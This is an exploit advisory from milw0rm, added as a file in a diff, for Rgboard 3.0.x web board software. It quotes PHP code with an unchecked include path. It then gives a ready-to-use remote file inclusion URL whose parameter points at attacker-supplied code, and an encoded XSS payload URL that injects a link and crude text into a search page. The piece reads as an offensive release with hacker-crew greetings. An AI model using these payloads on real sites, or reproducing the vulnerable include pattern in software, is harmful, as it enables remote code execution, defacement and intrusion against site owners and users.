@@ -1,0 +1,53 @@
+################################################
+#    Rgboard 3.0.x  Multiple Vulnerabilities   #
+#                  (RFI/XSS)                   #
+################################################
+
+/**/    Author::  e.wiZz!
+ 
+/**/   Site::  www.balcanwarez.com 
+ 
+/**/   Contact:: N/A :D
+===========================================================
+/**/   Script :: Rgboard
+ 
+/**/   Vulnerable version :: 3.0.0/3.0.12
+
+/**/ Not vulnerable :: 4.0 
+
+/**/   Download :: www.rgboard.com
+============================================================
+ 
+[<Remote File Include>]
+
+/**/ Vulnerable code,line 22:
+\include\bbs.lib.inc.php
+
+if (!defined(’BBS_LIB_INC_INCLUDED’)) {
+define(’BBS_LIB_INC_INCLUDED’, 1);
+// *start of include,eh?*
+
+if(!$site_path) $site_path=’./’;
+require_once “{$site_path}include/lib.inc.php”;
+//$site_path
+
+/**/  Exploit:
+
+http://www.target.com/include/bbs.lib.inc.php?site_path=evilthingg0ezhere
+             
+
+[<XSS>]
+
+/**/  Almost every field is vulnerable to xss,example(rg_search.php):
+ 
+/**/  Live demo:
+   http://xxx.com/rgboard/rg_search.php?bbs_id=search&page_no=2&s_text=%22%3E%3Ca+href%3D%22http%3A%2F%2Fbalcanwarez.com%22%3E%3Ch1%3EOvdje nesto bezze upises,boli me kita :D%3C%2Fh1%3E%3C%2Fa%3E        
+
+ 
+==============================================================
+/**/  Thanx : QKrun1x,F34R,aluigi,Nuclear,aluigi,str0ke
+ 
+/**/ PozdraF : deckima s elitesecurity.org i cyber-underground.org
+===============================================================
+
+# milw0rm.com [2008-05-14]
